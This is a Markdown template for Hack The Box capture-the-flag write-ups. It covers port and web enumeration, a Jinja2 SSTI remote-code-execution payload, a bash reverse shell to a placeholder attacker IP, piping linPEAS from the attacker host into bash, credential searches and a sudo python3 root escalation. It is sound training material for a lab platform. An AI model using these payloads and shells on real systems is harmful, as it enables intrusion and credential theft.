---
Title:
Site:
Machine:
draft: true
tags:
---

## 🗺️ Challenge Overview

| Field         | Detail                        |
| ------------- | ----------------------------- |
| Platform      | Hack The Box                  |
| Machine Name  | `{{name}}`                    |
| OS            | Linux / Windows               |
| Difficulty    | Easy / Medium / Hard          |
| IP Address    | `10.10.10.X`                  |
| Skills Req.   | Web enum; Linux privesc       |
| Skills Gained | SSTI exploitation; sudo abuse |

--- 
## 🔍 Enumeration

### Port Scan

```bash
nmap -sC -sV -T4 -oA nmap/initial TARGET_IP
```

**Open Ports:**

| Port | Service | Version     | Notes |
| ---- | ------- | ----------- | ----- |
| 22   | SSH     | OpenSSH 8.x |       |
| 80   | HTTP    | Apache 2.x  |       |
| 443  | HTTPS   | nginx       |       |

> [!tip] Add to `/etc/hosts` `echo "TARGET_IP target.htb" | sudo tee -a /etc/hosts`

### Web Enumeration

```bash
# Directory
gobuster dir -u http://TARGET_IP \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak -o gobuster.out

# Vhost
ffuf -u http://TARGET_IP \
  -H "Host: FUZZ.target.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 0 -o ffuf-vhosts.json
```

> [!warning] Don't skip Check `robots.txt`, `sitemap.xml`, page source comments, and response headers before jumping to brute-force.

**Key Findings:**

- [ ] Finding 1 — e.g., `/admin` returns 403, not 404 (directory exists)
- [ ] Finding 2 — e.g., `X-Powered-By: Jinja2` header leaks template engine

### Service-Specific Enumeration

```bash
# SMB
smbclient -L //TARGET_IP -N
smbmap -H TARGET_IP
enum4linux -a TARGET_IP

# FTP (check anon login)
ftp TARGET_IP

# SNMP
snmpwalk -c public -v1 TARGET_IP

# LDAP
ldapsearch -x -H ldap://TARGET_IP -b "dc=target,dc=htb"
```

---

## ⚔️ Exploitation

> [!danger] Vulnerability **Type:** e.g., Server-Side Template Injection (SSTI) **CVE:** CVE-XXXX-XXXX (if applicable) **Affected Component:** `/render` endpoint — user input passed unsanitized to Jinja2

### Proof of Concept

```bash
# Confirm SSTI
curl -s -X POST http://TARGET_IP/render \
  --data "name={{7*7}}" | grep "49"

# RCE payload
curl -s -X POST http://TARGET_IP/render \
  --data "name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

**Why it works:** Jinja2 evaluates `{{...}}` server-side. Without input sanitization, arbitrary Python expressions execute in the template context, giving access to `os` via Python's object inheritance chain.

### Getting a Shell

```bash
# Listener
pwncat-cs -lp 4444
# or
nc -lvnp 4444

# Reverse shell payload (URL-encode before sending)
bash -c 'bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1'
```

> [!success] Shell obtained **User:** `www-data` | **Shell:** `/bin/bash` Stabilize immediately: `python3 -c 'import pty;pty.spawn("/bin/bash")'` then `Ctrl+Z` → `stty raw -echo; fg`

---

## 🚩 User Flag

```bash
find /home -name user.txt 2>/dev/null
cat /home/{{user}}/user.txt
```

> [!example] Flag `HTB{flag_value_here}`

---

## 📈 Privilege Escalation

### Local Enumeration

```bash
# Quick Checks
id && whoami && hostname
sudo -l
cat /etc/crontab; ls -la /etc/cron.*
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null        # SGID
find / -writable -not -path "*/proc/*" -not -path "*/sys/*" 2>/dev/null
cat /etc/passwd | grep -v nologin             # Valid shell users

# Credentials
grep -r "password" /var/www/html/ 2>/dev/null
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | head -20

# LinPeas (upload to /tmp)
curl -s http://ATTACK_IP/linpeas.sh | bash | tee /tmp/linpeas.out
```

> [!warning] Don't run linPEAS first. The Quick Checks (`sudo -l`, SUID, cron, writable paths) are faster and less noisy. Automate only after manual checks.

**Checklist:**

- [ ] `sudo -l` — unrestricted binary or NOPASSWD entry
- [ ] SUID binary exploitable via [[GTFOBins]]
- [ ] Writable cron job or service file
- [ ] Stored credentials in configs / env files
- [ ] Weak file permissions on sensitive files (`/etc/passwd`, service keys)
- [ ] Running process owned by root with exploitable behavior
- [ ] Kernel version — check with `uname -r` against known exploits

### Escalation Path

> [!danger] Privesc Vector **Type:** e.g., Sudo misconfiguration — `python3` allowed as root with NOPASSWD **Evidence:** `sudo -l` shows `(root) NOPASSWD: /usr/bin/python3`

```bash
# Exploit
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Why it works:** `python3` is not restricted to a specific script path, so arbitrary code runs as root via the `os` module.

---

## 🚩 Root Flag

```bash
cat /root/root.txt
```

> [!example] Flag `HTB{flag_value_here}`

---

## 🔑 Key Findings

| Finding                        | Impact           | Location             |
| ------------------------------ | ---------------- | -------------------- |
| SSTI in Jinja2 template engine | RCE as www-data  | `POST /render`       |
| Plaintext DB creds in `.env`   | Lateral movement | `/var/www/html/.env` |
| `python3` in sudoers NOPASSWD  | Root privesc     | `sudo -l` output     |

---

## 📚 Lessons Learned

### What Worked

- Approach or tool that was effective and why it was effective

### Dead Ends

- What you tried that failed — document to avoid repeating on future boxes

### New Techniques

- Any new tool, payload, or methodology used for the first time

### Rule for Next Box

- e.g., "Always enumerate `sudo -l` before running LinPEAS"

---

## 🛠️ Tools Used

|Tool|Purpose|
|---|---|
|`nmap`|Port scanning & service detection|
|`gobuster`|Directory brute-force|
|`ffuf`|Vhost & parameter fuzzing|
|`pwncat-cs`|Shell stabilization & file xfer|
|`linpeas`|Local privilege escalation enum|
|`burpsuite`|HTTP interception & replay|

---


_Writeup by: HeyIAmSpooky | Date
